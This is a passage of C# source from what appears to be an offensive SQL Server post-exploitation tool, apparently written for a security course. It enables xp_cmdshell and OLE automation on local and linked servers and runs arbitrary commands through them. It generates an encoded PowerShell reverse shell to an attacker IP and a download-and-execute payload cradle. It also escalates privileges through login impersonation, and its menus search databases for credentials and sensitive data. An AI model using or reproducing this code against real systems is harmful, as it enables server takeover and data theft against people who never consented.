					if (root.TryGetProperty("ServerLogins", out var serverLogins))
					{
						sb.AppendLine("<h3>Server Logins</h3>");
						sb.AppendLine("<table>");
						sb.AppendLine("<tr><th>Login Name</th><th>Type</th><th>Disabled</th><th>Server Roles</th><th>Risk Level</th></tr>");
						
						foreach (var login in serverLogins.EnumerateArray())
						{
							string loginName = login.GetProperty("Name").GetString();
							string loginType = login.GetProperty("Type").GetString();
							bool isDisabled = login.GetProperty("IsDisabled").GetBoolean();
							
							var roles = login.GetProperty("ServerRoles").EnumerateArray().Select(r => r.GetString()).ToList();
							string highestRisk = "low";
							if (roles.Any())
							{
								var riskLevels = roles.Select(r => GetRoleSeverity(r)).ToList();
								var orderedRisks = riskLevels.OrderBy(s => s switch { "critical" => 0, "high" => 1, "medium" => 2, _ => 3 });
								highestRisk = orderedRisks.First();
							}
							
							sb.AppendLine("<tr>");
							sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(loginName)}</span></td>");
							sb.AppendLine($"<td>{WebUtility.HtmlEncode(loginType)}</td>");
							sb.AppendLine($"<td class='{(isDisabled ? "low" : "high")}'>{(isDisabled ? "Yes" : "No")}</td>");
							sb.AppendLine($"<td>{string.Join(", ", roles)}</td>");
							sb.AppendLine($"<td class='{highestRisk}'>{highestRisk.ToUpper()}</td>");
							sb.AppendLine("</tr>");
						}
						sb.AppendLine("</table>");
					}
					
					// High-Risk Logins
					if (root.TryGetProperty("ServerLogins", out var highRiskLogins))
					{
						var criticalLogins = new List<object>();
						
						foreach (var login in highRiskLogins.EnumerateArray())
						{
							var roles = login.GetProperty("ServerRoles").EnumerateArray().Select(r => r.GetString()).ToList();
							bool hasHighRiskRole = false;
							foreach (var role in roles)
							{
								string severity = GetRoleSeverity(role);
								if (severity == "critical" || severity == "high")
								{
									hasHighRiskRole = true;
									break;
								}
							}
							if (hasHighRiskRole)
							{
								criticalLogins.Add(login);
							}
						}
						
						if (criticalLogins.Any())
						{
							sb.AppendLine("<h3>High-Risk Server Logins</h3>");
							sb.AppendLine("<table>");
							sb.AppendLine("<tr><th>Login Name</th><th>Dangerous Roles</th><th>Status</th><th>Last Modified</th></tr>");
							
							foreach (var login in criticalLogins.Cast<JsonElement>())
							{
								string loginName = login.GetProperty("Name").GetString();
								bool isDisabled = login.GetProperty("IsDisabled").GetBoolean();
								var modifyDate = login.GetProperty("ModifyDate").GetDateTime();
								
								var roles = login.GetProperty("ServerRoles").EnumerateArray().Select(r => r.GetString()).ToList();
								var dangerousRoles = new List<string>();
								foreach (var role in roles)
								{
									string severity = GetRoleSeverity(role);
									if (severity == "critical" || severity == "high")
									{
										dangerousRoles.Add(role);
									}
								}
								
								sb.AppendLine("<tr>");
								sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(loginName)}</span></td>");
								sb.AppendLine($"<td class='critical'>{string.Join(", ", dangerousRoles)}</td>");
								sb.AppendLine($"<td class='{(isDisabled ? "low" : "critical")}'>{(isDisabled ? "Disabled" : "Active")}</td>");
								sb.AppendLine($"<td>{modifyDate:yyyy-MM-dd}</td>");
								sb.AppendLine("</tr>");
							}
							sb.AppendLine("</table>");
						}
					}
					
					// Database Users Summary
					if (root.TryGetProperty("DatabaseUsers", out var dbUsers))
					{
						var usersByDb = new Dictionary<string, List<JsonElement>>();
						
						foreach (var user in dbUsers.EnumerateArray())
						{
							string dbName = user.GetProperty("Database").GetString();
							if (!usersByDb.ContainsKey(dbName))
								usersByDb[dbName] = new List<JsonElement>();
							usersByDb[dbName].Add(user);
						}
						
						if (usersByDb.Any())
						{
							sb.AppendLine("<h3>Database Users by Database</h3>");
							sb.AppendLine("<table>");
							sb.AppendLine("<tr><th>Database</th><th>User Count</th><th>High-Risk Users</th><th>Users</th></tr>");
							
							foreach (var kvp in usersByDb)
							{
								var highRiskUsers = new List<JsonElement>();
								foreach (var u in kvp.Value)
								{
									var roles = u.GetProperty("DatabaseRoles").EnumerateArray().Select(r => r.GetString()).ToList();
									bool hasHighRiskRole = false;
									foreach (var role in roles)
									{
										string severity = GetRoleSeverity(role);
										if (severity == "critical" || severity == "high")
										{
											hasHighRiskRole = true;
											break;
										}
									}
									if (hasHighRiskRole)
									{
										highRiskUsers.Add(u);
									}
								}
								
								sb.AppendLine("<tr>");
								sb.AppendLine($"<td><span class='code'>{WebUtility.HtmlEncode(kvp.Key)}</span></td>");
								sb.AppendLine($"<td>{kvp.Value.Count}</td>");
								sb.AppendLine($"<td class='{(highRiskUsers.Any() ? "critical" : "low")}'>{highRiskUsers.Count}</td>");
								
								var userNames = kvp.Value.Take(5).Select(u => u.GetProperty("Name").GetString());
								sb.AppendLine($"<td>{string.Join(", ", userNames)}{(kvp.Value.Count > 5 ? "..." : "")}</td>");
								sb.AppendLine("</tr>");
							}
							sb.AppendLine("</table>");
						}
					}
				}
				catch (Exception ex)
				{
					sb.AppendLine("<h2>User and Permission Analysis</h2>");
					sb.AppendLine($"<p class='error'>Error loading user permission data: {WebUtility.HtmlEncode(ex.Message)}</p>");
				}
			}
		}

		public void Close()
		{
			if (logWriter == null) return;

			LogAction("SESSION_END", "Session completed", "All operations finished");
			GenerateReport();
			logWriter?.Close();
		}
	}

	public class Program
	{
		private static SessionLogger logger;
		// Helper to pull a value from --switch <value>
		private static string Arg(string[] args, string name, string defaultVal = null)
		{
			for (int i = 0; i < args.Length - 1; i++)
			{
				if (args[i].Equals(name, StringComparison.OrdinalIgnoreCase))
					return args[i + 1];
			}
			return defaultVal;
		}

		private static bool HasFlag(string[] args, string flag)
		{
			return args.Any(a => a.Equals(flag, StringComparison.OrdinalIgnoreCase));
		}

		private static string ExecuteScalar(string sql, SqlConnection con)
		{
			try
			{
				using var cmd = new SqlCommand(sql, con);
				using var reader = cmd.ExecuteReader();
				return reader.Read() ? reader[0].ToString() : string.Empty;
			}
			catch (SqlException ex)
			{
				Console.WriteLine($"[SQL-Scalar] {ex.Message}");
				return string.Empty;
			}
		}

		private static bool ExecuteNonQuery(string sql, SqlConnection con)
		{
			try
			{
				using var cmd = new SqlCommand(sql, con);
				cmd.ExecuteNonQuery();
				return true;
			}
			catch (SqlException ex)
			{
				Console.WriteLine($"[SQL-Exec] {ex.Message}");
				return false;
			}
		}

		private static string B64EncodeUnicode(string plainText)
		{
			var plainTextBytes = System.Text.Encoding.Unicode.GetBytes(plainText);
			return System.Convert.ToBase64String(plainTextBytes);
		}

		private static void EnableAdvancedOption(string feature, SqlConnection con)
		{
			string sql = $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure '{feature}', 1; RECONFIGURE;";
			if (ExecuteNonQuery(sql, con))
				Console.WriteLine($"[+] Enabled {feature}");
		}

		private static void OAExec(string cmd, SqlConnection con)
		{
			string sanitized = cmd.Replace("'", "''");
			
			// Use the exact pattern from course materials with cmd /c wrapper
			string wrappedCmd = $"cmd /c \"{sanitized}\"";
			string sql = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{wrappedCmd}';";
			
			try
			{
				// Increase timeout for OLE operations and use ExecuteNonQuery
				using (var command = new SqlCommand(sql, con))
				{
					command.CommandTimeout = 60; // 60 second timeout
					command.ExecuteNonQuery();
				}
				Console.WriteLine("[+] sp_OA command executed successfully");
				Console.WriteLine("[i] Note: OLE commands don't return output. Check target system for results.");
				logger?.LogAction("OLE_EXECUTION", cmd, "OLE command executed successfully (no output returned)", "SUCCESS");
			}
			catch (SqlException ex)
			{
				if (ex.Message.Contains("timeout") || ex.Message.Contains("Timeout"))
				{
					Console.WriteLine("[+] Command may have executed (timeout is normal for OLE operations)");
					Console.WriteLine("[i] Check target system for results.");
					logger?.LogAction("OLE_EXECUTION", cmd, "OLE command timed out (normal behavior)", "SUCCESS");
				}
				else
				{
					Console.WriteLine($"[!] SQL error: {ex.Message}");
					Console.WriteLine("[i] You may need sysadmin rights or EXECUTE permission on OLE procedures.");
					logger?.LogAction("OLE_EXECUTION", cmd, $"OLE error: {ex.Message}", "ERROR");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
				logger?.LogAction("OLE_EXECUTION", cmd, $"Unexpected error: {ex.Message}", "ERROR");
			}
		}

		private static void ExecuteCmd(string sql, SqlConnection con, bool skipEnable = false)
		{
			if (!skipEnable)
				EnableAdvancedOption("xp_cmdshell", con);
			
			var outputLines = new List<string>();
			
			try
			{
				using var cmd = new SqlCommand(sql, con);
				cmd.CommandTimeout = 30; // Set reasonable timeout for commands
				
				using var reader = cmd.ExecuteReader();
				
				while (reader.Read())
				{
					string output = reader[0]?.ToString();
					if (!string.IsNullOrEmpty(output))
					{
						Console.WriteLine(output);
						outputLines.Add(output);
					}
				}
				
				// Log the command execution
				string commandOutput = string.Join("\n", outputLines);
				logger?.LogAction("COMMAND_EXECUTION", ExtractCommandFromSql(sql), commandOutput);
			}
			catch (SqlException ex)
			{
				string errorMsg = $"SQL Error: {ex.Message}";
				Console.WriteLine($"[!] {errorMsg}");
				logger?.LogAction("COMMAND_EXECUTION", ExtractCommandFromSql(sql), errorMsg, "ERROR");
			}
			catch (Exception ex)
			{
				string errorMsg = $"Error: {ex.Message}";
				Console.WriteLine($"[!] {errorMsg}");
				logger?.LogAction("COMMAND_EXECUTION", ExtractCommandFromSql(sql), errorMsg, "ERROR");
			}
		}

		private static string ExtractCommandFromSql(string sql)
		{
			// Extract the actual command from the SQL for logging
			if (sql.Contains("xp_cmdshell"))
			{
				// Extract command from xp_cmdshell calls
				var match = Regex.Match(sql, @"xp_cmdshell\s+'([^']+)'", RegexOptions.IgnoreCase);
				if (match.Success)
					return match.Groups[1].Value.Replace("''", "'");
			}
			return sql;
		}

		private static string GenerateRevShell(string ip, string port)
		{
			string psScript = $@"
$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
".Trim();
			
			return B64EncodeUnicode(psScript);
		}

		private static string GeneratePayloadUrl(string url)
		{
			string psScript = $"IEX ((new-object net.webclient).downloadstring('{url}'))";
			return B64EncodeUnicode(psScript);
		}

		// Consolidated linked server connectivity test
		private static string TestLinkedServerConnectivity(string srv, SqlConnection con)
		{
			// Method 1: OPENQUERY
			string login = ExecuteScalar($"SELECT TOP 1 * FROM OPENQUERY([{srv}], 'SELECT SYSTEM_USER')", con);
			if (!string.IsNullOrEmpty(login)) return login;

			// Method 2: INSERT...EXEC capture
			string tempSql = $"DECLARE @t TABLE(val sysname); INSERT @t EXEC ('SELECT SYSTEM_USER') AT [{srv}]; SELECT TOP 1 val FROM @t;";
			return ExecuteScalar(tempSql, con);
		}

		// Consolidated linked server command execution test
		private static bool TestLinkedServerExecution(string srv, SqlConnection con)
		{
			try
			{
				// Try to execute a simple command and capture all results
				string testCmd = $"EXEC ('xp_cmdshell ''echo CMDTEST123''') AT [{srv}]";
				bool foundResult = false;
				
				using (var cmd = new SqlCommand(testCmd, con))
				using (var reader = cmd.ExecuteReader())
				{
					while (reader.Read())
					{
						string output = reader[0]?.ToString();
						if (!string.IsNullOrEmpty(output) && output.Contains("CMDTEST123"))
						{
							foundResult = true;
							break;
						}
					}
				}
				
				if (foundResult) return true;

				// Try enabling xp_cmdshell first
				string enableCmd = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{srv}]";
				ExecuteNonQuery(enableCmd, con);
				
				// Test again with full reader
				using (var cmd = new SqlCommand(testCmd, con))
				using (var reader = cmd.ExecuteReader())
				{
					while (reader.Read())
					{
						string output = reader[0]?.ToString();
						if (!string.IsNullOrEmpty(output) && output.Contains("CMDTEST123"))
						{
							return true;
						}
					}
				}
				
				return false;
			}
			catch (Exception)
			{
				return false;
			}
		}

		// Consolidated permission testing for impersonatable logins
		private static List<string> TestLoginPermissions(string loginName, SqlConnection con)
		{
			var permissions = new List<string>();
			
			try
			{
				ExecuteNonQuery($"EXECUTE AS LOGIN = '{loginName.Replace("'", "''")}'", con);
				
				// Check server roles
				if (ExecuteScalar("SELECT IS_SRVROLEMEMBER('sysadmin');", con) == "1")
					permissions.Add("SYSADMIN (full control)");
				if (ExecuteScalar("SELECT IS_SRVROLEMEMBER('securityadmin');", con) == "1")
					permissions.Add("SECURITYADMIN (manage logins)");
				if (ExecuteScalar("SELECT IS_SRVROLEMEMBER('serveradmin');", con) == "1")
					permissions.Add("SERVERADMIN (server config)");
				if (ExecuteScalar("SELECT IS_SRVROLEMEMBER('dbcreator');", con) == "1")
					permissions.Add("DBCREATOR (create databases)");
				
				// Test specific dangerous permissions
				if (ExecuteScalar("SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'CONTROL SERVER');", con) == "1")
					permissions.Add("CONTROL SERVER");
				if (ExecuteScalar("SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ALTER ANY LOGIN');", con) == "1")
					permissions.Add("ALTER ANY LOGIN");
				if (ExecuteScalar("SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'IMPERSONATE ANY LOGIN');", con) == "1")
					permissions.Add("IMPERSONATE ANY LOGIN");
				
				// Test xp_cmdshell capability
				string cmdshellTest = ExecuteScalar("SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';", con);
				if (cmdshellTest == "1")
					permissions.Add("XP_CMDSHELL (enabled)");
				else if (ExecuteScalar("SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ALTER SETTINGS');", con) == "1")
					permissions.Add("CAN ENABLE XP_CMDSHELL");

				ExecuteNonQuery("REVERT;", con);
			}
			catch (Exception)
			{
				// Ignore failures
			}
			
			return permissions;
		}

		// Consolidated escalation analysis for a login
		private static bool AnalyzeLoginEscalation(string loginName, List<string> roles, SqlConnection con)
		{
			try
			{
				ExecuteNonQuery($"EXECUTE AS LOGIN = '{loginName.Replace("'", "''")}'", con);
				
				bool canControlServer = ExecuteScalar("SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'CONTROL SERVER');", con) == "1";
				bool isSysAdmin = ExecuteScalar("SELECT IS_SRVROLEMEMBER('sysadmin');", con) == "1";
				bool canAlterSettings = ExecuteScalar("SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ALTER SETTINGS');", con) == "1";
				bool canImpersonateAny = ExecuteScalar("SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'IMPERSONATE ANY LOGIN');", con) == "1";
				bool canAlterLogin = ExecuteScalar("SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'ALTER ANY LOGIN');", con) == "1";
				
				ExecuteNonQuery("REVERT;", con);
				
				if (isSysAdmin || canControlServer)
				{
					Console.WriteLine($"🚀 CRITICAL ESCALATION: Impersonate '{loginName}' (FULL CONTROL)");
					Console.WriteLine($"   • Use: EXECUTE AS LOGIN = '{loginName}'");
					Console.WriteLine("   • Then enable xp_cmdshell for code execution");
					Console.WriteLine("   • Full server administrative privileges");
					return true;
				}
				else if (canImpersonateAny)
				{
					Console.WriteLine($"🎭 HIGH-VALUE ESCALATION: Impersonate '{loginName}' (CAN IMPERSONATE ANYONE)");
					Console.WriteLine($"   • Use: EXECUTE AS LOGIN = '{loginName}'");
					Console.WriteLine("   • Then impersonate sysadmin accounts");
					return true;
				}
				else if (canAlterLogin)
				{
					Console.WriteLine($"👤 ESCALATION POTENTIAL: Impersonate '{loginName}' (CAN ALTER LOGINS)");
					Console.WriteLine($"   • Use: EXECUTE AS LOGIN = '{loginName}'");
					Console.WriteLine("   • Can modify login permissions/passwords");
					return true;
				}
				else if (canAlterSettings)
				{
					Console.WriteLine($"⚡ EXECUTION POTENTIAL: Impersonate '{loginName}' (CAN ENABLE FEATURES)");
					Console.WriteLine($"   • Use: EXECUTE AS LOGIN = '{loginName}'");
					Console.WriteLine("   • Can enable xp_cmdshell, OLE automation, etc.");
					return true;
				}
				else if (roles.Any(r => new[] { "securityadmin", "serveradmin", "dbcreator" }.Contains(r)))
				{
					Console.WriteLine($"⚡ POTENTIAL ESCALATION: Impersonate '{loginName}' ({string.Join(", ", roles)})");
					Console.WriteLine("   • May lead to further privilege escalation");
					return true;
				}
			}
			catch (Exception)
			{
				// Skip if impersonation fails
			}
			
			return false;
		}

		// OLE Automation execution menu
		private static void ShowOAExecutionMenu(SqlConnection con)
		{
			Console.WriteLine("=== sp_OA (OLE Automation) Execution ===");
			Console.WriteLine("1) Single command");
			Console.WriteLine("2) Interactive shell");
			Console.WriteLine("3) RevShell");
			Console.WriteLine("4) Payload URL");
			Console.Write("Select: ");
			string choice = Console.ReadLine();

			// Log menu selection
			logger?.LogAction("MENU_SELECTION", $"OLE Automation - Option {choice}", $"Selected OLE execution option {choice}", "SUCCESS", "Local Server");

			// Enable OLE Automation Procedures
			EnableAdvancedOption("Ole Automation Procedures", con);
			Console.WriteLine("[+] Enabled OLE Automation Procedures");
			logger?.LogAction("FEATURE_ENABLE", "Enable OLE Automation Procedures", "Successfully enabled OLE Automation", "SUCCESS", "Local Server");

			switch (choice)
			{
				case "1":
					Console.Write("Command: ");
					string cmd1 = Console.ReadLine();
					logger?.LogAction("OLE_COMMAND", cmd1, "Executing single OLE command", "SUCCESS", "Local Server");
					OAExec(cmd1, con);
					break;
					
				case "2":
					Console.WriteLine("Interactive OLE shell (type 'exit' to quit):");
					Console.WriteLine("[i] Note: Commands execute but don't return output");
					logger?.LogAction("OLE_INTERACTIVE_START", "Interactive OLE shell started", "Started interactive OLE shell session", "SUCCESS", "Local Server");
					
					while (true)
					{
						Console.Write("oa> ");
						string cmd2 = Console.ReadLine();
						if (cmd2?.ToLower() == "exit") 
						{
							logger?.LogAction("OLE_INTERACTIVE_END", "Interactive OLE shell ended", "User exited interactive OLE shell", "SUCCESS", "Local Server");
							break;
						}
						if (!string.IsNullOrEmpty(cmd2))
						{
							logger?.LogAction("OLE_COMMAND", cmd2, "Executing OLE command in interactive mode", "SUCCESS", "Local Server");
							OAExec(cmd2, con);
						}
					}
					break;
					
				case "3":
					Console.Write("Attacker IP: ");
					string ip3 = Console.ReadLine();
					Console.Write("Attacker Port: ");
					string port3 = Console.ReadLine();
					
					string revShell3 = GenerateRevShell(ip3, port3);
					Console.WriteLine($"\nExecuting reverse shell to {ip3}:{port3} via OLE...");
					Console.WriteLine("[!] WARNING: OLE reverse shell may not provide feedback.");
					Console.WriteLine("[!] Check your listener for connections.");
					
					string psCmd3 = $"powershell -EncodedCommand {revShell3}";
					logger?.LogAction("OLE_REVERSE_SHELL", $"Reverse shell to {ip3}:{port3}", "Executing OLE reverse shell", "SUCCESS", "Local Server");
					OAExec(psCmd3, con);
					break;
					
				case "4":
					Console.Write("Payload URL: ");
					string url4 = Console.ReadLine();
					
					string payloadCmd4 = GeneratePayloadUrl(url4);
					Console.WriteLine($"\nExecuting payload from {url4} via OLE...");
					string psCmd4 = $"powershell -EncodedCommand {payloadCmd4}";
					logger?.LogAction("OLE_PAYLOAD", $"Execute payload from {url4}", "Executing remote payload via OLE", "SUCCESS", "Local Server");
					OAExec(psCmd4, con);
					break;
			}
		}

		// Consolidated command execution menu
		private static void ShowExecutionMenu(string context, SqlConnection con, string linkedServer = null)
		{
			Console.WriteLine($"=== {context} ===");
			Console.WriteLine("1) Single command");
			Console.WriteLine("2) Interactive shell");
			Console.WriteLine("3) RevShell");
			Console.WriteLine("4) Payload URL");
			Console.Write("Select: ");
			string choice = Console.ReadLine();

			// Log menu selection
			string menuContext = linkedServer != null ? $"Linked Server: {linkedServer}" : "Local Server";
			logger?.LogAction("MENU_SELECTION", $"{context} - Option {choice}", $"Selected execution option {choice}", "SUCCESS", menuContext);

			// Enable xp_cmdshell on the appropriate server
			if (linkedServer == null)
			{
				EnableAdvancedOption("xp_cmdshell", con);
			}
			else
			{
				// Enable xp_cmdshell on the linked server
				string enableCmd = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linkedServer}]";
				ExecuteNonQuery(enableCmd, con);
				Console.WriteLine($"[+] Enabled xp_cmdshell on [{linkedServer}]");
				logger?.LogAction("FEATURE_ENABLE", $"Enable xp_cmdshell on {linkedServer}", "Successfully enabled xp_cmdshell", "SUCCESS", menuContext);
			}

			switch (choice)
			{
				case "1":
					Console.Write("Command: ");
					string cmd1 = Console.ReadLine();
					string escapedCmd1 = cmd1?.Replace("'", "''");
					string finalSql = linkedServer == null ? 
						$"EXEC xp_cmdshell '{escapedCmd1}';" : 
						$"EXEC ('xp_cmdshell ''{escapedCmd1}''') AT [{linkedServer}];";
					ExecuteCmd(finalSql, con, true);
					break;
					
				case "2":
					string prompt = linkedServer == null ? "cmd> " : $"{linkedServer}> ";
					Console.WriteLine($"Interactive shell{(linkedServer != null ? $" on [{linkedServer}]" : "")} (type 'exit' to quit):");
					logger?.LogAction("INTERACTIVE_SHELL_START", $"Interactive shell started", $"Started interactive shell session", "SUCCESS", menuContext);
					
					while (true)
					{
						Console.Write(prompt);
						string cmd2 = Console.ReadLine();
						if (cmd2?.ToLower() == "exit") 
						{
							logger?.LogAction("INTERACTIVE_SHELL_END", "Interactive shell ended", "User exited interactive shell", "SUCCESS", menuContext);
							break;
						}
						if (!string.IsNullOrEmpty(cmd2))
						{
							string escapedCmd2 = cmd2.Replace("'", "''");
							string sql2 = linkedServer == null ? 
								$"EXEC xp_cmdshell '{escapedCmd2}';" : 
								$"EXEC ('xp_cmdshell ''{escapedCmd2}''') AT [{linkedServer}];";
							ExecuteCmd(sql2, con, true);
						}
					}
					break;
					
				case "3":
					Console.Write("Attacker IP: ");
					string ip3 = Console.ReadLine();
					Console.Write("Attacker Port: ");
					string port3 = Console.ReadLine();
					
					string revShell3 = GenerateRevShell(ip3, port3);
					string target3 = linkedServer != null ? $" on [{linkedServer}]" : "";
					Console.WriteLine($"\nExecuting reverse shell to {ip3}:{port3}{target3}...");
					Console.WriteLine("[!] WARNING: Reverse shell execution may cause connection timeouts.");
					Console.WriteLine("[!] This is normal behavior. The session will continue after timeout.");
					
					string psCmd3 = $"powershell -EncodedCommand {revShell3}";
					string sql3 = linkedServer == null ? 
						$"EXEC xp_cmdshell '{psCmd3}';" : 
						$"EXEC ('xp_cmdshell ''{psCmd3}''') AT [{linkedServer}];";
					
					logger?.LogAction("REVERSE_SHELL_ATTEMPT", $"Reverse shell to {ip3}:{port3}", $"Attempting reverse shell connection{target3}", "SUCCESS", menuContext);
					
					try
					{
						ExecuteCmdWithTimeout(sql3, con, true, 10); // 10 second timeout for reverse shells
						Console.WriteLine("[+] Reverse shell command executed successfully");
					}
					catch (Exception ex)
					{
						Console.WriteLine($"[!] Reverse shell execution completed (timeout expected): {ex.Message}");
						logger?.LogAction("REVERSE_SHELL_TIMEOUT", $"Reverse shell to {ip3}:{port3}", "Reverse shell timed out (expected behavior)", "SUCCESS", menuContext);
					}
					break;
					
				case "4":
					Console.Write("Payload URL: ");
					string url4 = Console.ReadLine();
					
					string payloadCmd4 = GeneratePayloadUrl(url4);
					string target4 = linkedServer != null ? $" on [{linkedServer}]" : "";
					Console.WriteLine($"\nExecuting payload from {url4}{target4}...");
					string psCmd4 = $"powershell -EncodedCommand {payloadCmd4}";
					string sql4 = linkedServer == null ? 
						$"EXEC xp_cmdshell '{psCmd4}';" : 
						$"EXEC ('xp_cmdshell ''{psCmd4}''') AT [{linkedServer}];";
					
					logger?.LogAction("PAYLOAD_EXECUTION", $"Execute payload from {url4}", $"Executing remote payload{target4}", "SUCCESS", menuContext);
					ExecuteCmd(sql4, con, true);
					break;
			}
		}

		// Enhanced command execution with timeout handling
		private static void ExecuteCmdWithTimeout(string sql, SqlConnection con, bool skipEnable = false, int timeoutSeconds = 30)
		{
			if (!skipEnable)
				EnableAdvancedOption("xp_cmdshell", con);
			
			var outputLines = new List<string>();
			
			try
			{
				using var cmd = new SqlCommand(sql, con);
				cmd.CommandTimeout = timeoutSeconds;
				
				using var reader = cmd.ExecuteReader();
				
				while (reader.Read())
				{
					string output = reader[0]?.ToString();
					if (!string.IsNullOrEmpty(output))
					{
						Console.WriteLine(output);
						outputLines.Add(output);
					}
				}
				
				// Log the command execution
				string commandOutput = string.Join("\n", outputLines);
				logger?.LogAction("COMMAND_EXECUTION", ExtractCommandFromSql(sql), commandOutput);
			}
			catch (SqlException ex) when (ex.Number == -2) // Timeout
			{
				throw new TimeoutException($"Command execution timed out after {timeoutSeconds} seconds", ex);
			}
			catch (SqlException ex)
			{
				string errorMsg = $"SQL Error: {ex.Message}";
				Console.WriteLine($"[!] {errorMsg}");
				logger?.LogAction("COMMAND_EXECUTION", ExtractCommandFromSql(sql), errorMsg, "ERROR");
				throw;
			}
			catch (Exception ex)
			{
				string errorMsg = $"Error: {ex.Message}";
				Console.WriteLine($"[!] {errorMsg}");
				logger?.LogAction("COMMAND_EXECUTION", ExtractCommandFromSql(sql), errorMsg, "ERROR");
				throw;
			}
		}

		// Database enumeration menu with browser-like navigation
		private static void ShowDatabaseEnumerationMenu(SqlConnection con)
		{
			string currentDb = ExecuteScalar("SELECT DB_NAME();", con);
			DatabaseBrowser(con, currentDb, null);
		}

		private static void DatabaseBrowser(SqlConnection con, string currentDb, string currentTable)
		{
			while (true)
			{
				Console.WriteLine("\n" + new string('=', 60));
				Console.WriteLine($"DATABASE BROWSER - Current: {currentDb ?? "Server Level"}");
				if (!string.IsNullOrEmpty(currentTable))
					Console.WriteLine($"Table: {currentTable}");
				Console.WriteLine(new string('=', 60));

				if (string.IsNullOrEmpty(currentDb))
				{
					// Server level - show databases
					ShowServerLevelMenu(con, out currentDb);
					if (currentDb == "EXIT") return;
				}
				else if (string.IsNullOrEmpty(currentTable))
				{
					// Database level - show tables
					ShowDatabaseLevelMenu(con, ref currentDb, out currentTable);
					if (currentDb == "EXIT") return;
				}
				else
				{
					// Table level - show table operations
					ShowTableLevelMenu(con, currentDb, ref currentTable);
				}
			}
		}

		private static void ShowServerLevelMenu(SqlConnection con, out string selectedDb)
		{
			selectedDb = null;
			
			Console.WriteLine("Available Databases:");
			var databases = new List<string>();
			
			try
			{
				using (var cmd = new SqlCommand("SELECT name FROM sys.databases ORDER BY name;", con))
				using (var reader = cmd.ExecuteReader())
				{
					int index = 1;
					while (reader.Read())
					{
						string dbName = reader[0].ToString();
						databases.Add(dbName);
						Console.WriteLine($"  {index,2}) {dbName}");
						index++;
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
				return;
			}

			Console.WriteLine("\nSearch Options:");
			Console.WriteLine($"  {databases.Count + 1,2}) Search for interesting tables (all databases)");
			Console.WriteLine($"  {databases.Count + 2,2}) Search for credentials (all databases)");
			Console.WriteLine($"  {databases.Count + 3,2}) Search for sensitive data (all databases)");
			Console.WriteLine($"  {databases.Count + 4,2}) Find tables with specific column (all databases)");
			Console.WriteLine($"\n   0) Back to main menu");
			
			Console.Write("\nSelect database or search option: ");
			string choice = Console.ReadLine();
			
			if (choice == "0")
			{
				selectedDb = "EXIT";
				return;
			}

			if (int.TryParse(choice, out int dbIndex))
			{
				if (dbIndex >= 1 && dbIndex <= databases.Count)
				{
					selectedDb = databases[dbIndex - 1];
					return;
				}
				else if (dbIndex == databases.Count + 1)
				{
					SearchInterestingTables(con);
					Console.WriteLine("\nPress any key to continue...");
					Console.ReadKey();
					return;
				}
				else if (dbIndex == databases.Count + 2)
				{
					SearchCredentials(con);
					Console.WriteLine("\nPress any key to continue...");
					Console.ReadKey();
					return;
				}
				else if (dbIndex == databases.Count + 3)
				{
					SearchSensitiveData(con);
					Console.WriteLine("\nPress any key to continue...");
					Console.ReadKey();
					return;
				}
				else if (dbIndex == databases.Count + 4)
				{
					Console.Write("Column name to search for: ");
					string columnName = Console.ReadLine();
					FindTablesWithColumn(columnName, con);
					Console.WriteLine("\nPress any key to continue...");
					Console.ReadKey();
					return;
				}
			}
			
			Console.WriteLine("Invalid selection!");
		}

		private static void ShowDatabaseLevelMenu(SqlConnection con, ref string currentDb, out string selectedTable)
		{
			selectedTable = null;
			
			Console.WriteLine($"Tables in database '{currentDb}':");
			var tables = new List<(string schema, string name)>();
			
			try
			{
				string sql = $@"SELECT t.TABLE_SCHEMA, t.TABLE_NAME
					FROM [{currentDb}].INFORMATION_SCHEMA.TABLES t 
					WHERE t.TABLE_TYPE = 'BASE TABLE'
					ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME;";
				
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					int index = 1;
					while (reader.Read())
					{
						string schema = reader[0].ToString();
						string tableName = reader[1].ToString();
						tables.Add((schema, tableName));
						Console.WriteLine($"  {index,2}) {schema}.{tableName}");
						index++;
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
				return;
			}

			if (tables.Count == 0)
			{
				Console.WriteLine("   (no tables found)");
			}

			Console.WriteLine("\nDatabase Actions:");
			Console.WriteLine($"  {tables.Count + 1,2}) Search interesting tables in this database");
			Console.WriteLine($"  {tables.Count + 2,2}) Search credentials in this database");
			Console.WriteLine($"  {tables.Count + 3,2}) Search sensitive data in this database");
			Console.WriteLine($"  {tables.Count + 4,2}) Find tables with specific column");
			Console.WriteLine($"\n   b) Back to database list");
